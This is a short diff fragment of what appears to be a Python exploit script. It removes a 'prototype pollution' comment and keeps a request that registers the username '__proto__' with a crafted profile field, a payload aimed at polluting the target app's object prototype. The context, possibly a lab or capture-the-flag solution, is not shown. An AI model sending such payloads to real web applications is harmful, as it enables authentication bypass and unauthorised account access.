@@ -7,7 +7,6 @@ import requests
 import sys
 s = requests.Session()
 
-# Step 1: prototype pollution
 r = s.post(
     f"{BASE_URL}/register",
     json={"username": "__proto__", "password": "pw", "profile": {"password": True}},
